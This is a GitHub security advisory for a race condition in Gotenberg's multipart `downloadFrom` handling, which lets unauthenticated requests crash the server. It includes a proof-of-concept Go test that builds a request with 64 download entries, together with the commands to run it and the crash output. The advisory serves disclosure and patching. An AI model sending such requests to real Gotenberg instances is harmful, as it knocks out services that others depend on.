# [H] Gotenberg has a Race Condition via Multipart `downloadFrom` Handling

## Summary
Severity: High
Advisory: GHSA-vp73-vjw8-8f32
CVE: CVE-2026-45742
CWE: CWE-362
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-29
Source: https://github.com/advisories/GHSA-vp73-vjw8-8f32
Type: github-advisory

## Affected
- Go: `github.com/gotenberg/gotenberg/v8` — affected >=8.10.0 <8.33.0

## Details
### Summary

Gotenberg is vulnerable to a remote denial of service in multipart `downloadFrom` handling.

A multipart request containing multiple `downloadFrom` entries causes concurrent goroutines to write to shared maps without synchronization. This can terminate the process with `fatal error: concurrent map writes`.

In the default configuration, `downloadFrom` is enabled and authentication is disabled, so an exposed instance can be crashed by an unauthenticated remote attacker.

### Details

The issue is in `pkg/modules/api/context.go`.

`newContext` parses multipart requests and processes the `downloadFrom` form field before the route handler runs. For each `downloadFrom` entry, it starts a goroutine via `errgroup.Go()`:

- `pkg/modules/api/context.go:221`

Each goroutine downloads a file and then writes to request context maps shared by all goroutines:

- `ctx.files[filename] = path`
- `ctx.diskToOriginal[path] = filename`
- `ctx.filesByField[...] = append(...)`

Affected lines in current `main`:

- `pkg/modules/api/context.go:395`
- `pkg/modules/api/context.go:396`
- `pkg/modules/api/context.go:401`

Go maps and slices are not safe for concurrent writes. A crafted multipart request with many `downloadFrom` entries can therefore trigger a runtime crash.

The vulnerable `downloadFrom` feature was introduced in commit `f2b6bd3d`. The first tagged release containing this code appears to be `v8.10.0`.

### PoC

The following self-contained command creates a temporary test file, runs the PoC, and removes the file afterwards. It does not require any external network access.

Run from the repository root:

    cat > pkg/modules/api/downloadfrom_race_poc_test.go <<'EOF'
    //go:build security_poc

    package api

    import (
        "bytes"
        "encoding/json"
        "fmt"
        "log/slog"
        "mime/multipart"
        "net/http"
        "net/http/httptest"
        "sync"
        "testing"
        "time"

        "github.com/labstack/echo/v4"

        "github.com/gotenberg/gotenberg/v8/pkg/gotenberg"
    )

    func TestSecurityPoCDownloadFromConcurrentMapWrites(t *testing.T) {
        const downloads = 64

        var ready sync.WaitGroup
        ready.Add(downloads)
        release := make(chan struct{})
        var releaseOnce sync.Once

        server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            ready.Done()
            go func() {
                ready.Wait()
                releaseOnce.Do(func() {
                    close(release)
                })
            }()
            <-release

            filename := fmt.Sprintf("download-%s.txt", r.URL.Query().Get("i"))
            w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, filename))
            _, _ = w.Write([]byte("downloaded"))
        }))
        defer server.Close()

        dls := make([]downloadFrom, downloads)
        for i := range dls {
            dls[i] = downloadFrom{
                Url:   fmt.Sprintf("%s/file?i=%d", server.URL, i),
                Field: "embedded",
            }
        }

        payload, err := json.Marshal(dls)
        if err != nil {
            t.Fatalf("marshal downloadFrom payload: %v", err)
        }

        body := new(bytes.Buffer)
        writer := multipart.NewWriter(body)
        err = writer.WriteField("downloadFrom", string(payload))
        if err != nil {
            t.Fatalf("write downloadFrom field: %v", err)
        }
        err = writer.Close()
        if err != nil {
            t.Fatalf("close multipart writer: %v", err)
        }

        req := httptest.NewRequest(http.MethodPost, "/forms/libreoffice/convert", body)
        req.Header.Set("Content-Type", writer.FormDataContentType())

        echoCtx := echo.New().NewContext(req, httptest.NewRecorder())
        logger := slog.New(slog.DiscardHandler)
        fs := gotenberg.NewFileSystem(new(gotenberg.OsMkdirAll))
        downloadFromCfg := downloadFromConfig{
            maxRetry: 0,
        }

        ctx, cancel, err := newContext(echoCtx, logger, fs, 10*time.Second, 0, downloadFromCfg)
        if err != nil {
            t.Fatalf("newContext returned error: %v", err)
        }
        defer cancel()

        if got := len(ctx.files); got != downloads {
            t.Fatalf("downloaded files = %d, want %d", got, downloads)
        }
    }
    EOF

    GOTOOLCHAIN=go1.26.2 go test -race -tags security_poc ./pkg/modules/api -run TestSecurityPoCDownloadFromConcurrentMapWrites -count=1
    rm pkg/modules/api/downloadfrom_race_poc_test.go

Expected result with the race detector:

    WARNING: DATA RACE
    Write at ...
      github.com/gotenberg/gotenberg/v8/pkg/modules/api.newContext.func3()
        .../pkg/modules/api/context.go:395

    WARNING: DATA RACE
      .../pkg/modules/api/context.go:396

    WARNING: DATA RACE
      .../pkg/modules/api/context.go:401

Running the same PoC without `-race` also demonstrates practical process termination:

    GOTOOLCHAIN=go1.26.2 go test -tags security_poc ./pkg/modules/api -run TestSecurityPoCDownloadFromConcurrentMapWrites -count=20

Observed result:

    fatal error: concurrent map writes
    github.com/gotenberg/gotenberg/v8/pkg/modules/api.newContext.func3()
      .../pkg/modules/api/context.go:395
    FAIL github.com/gotenberg/gotenberg/v8/pkg/modules/api

### Impact

This is a remote denial-of-service vulnerability.

Any deployment that exposes multipart conversion endpoints with `downloadFrom` enabled is affected. In the default configuration, `downloadFrom` is enabled and basic authentication is disabled, so internet-exposed default deployments may be vulnerable to unauthenticated process termination.

The vulnerability affects availability only. I did not find evidence of confidentiality or integrity impact.

## References
- https://github.com/gotenberg/gotenberg/security/advisories/GHSA-vp73-vjw8-8f32
- https://github.com/gotenberg/gotenberg
- https://github.com/gotenberg/gotenberg/releases/tag/v8.33.0
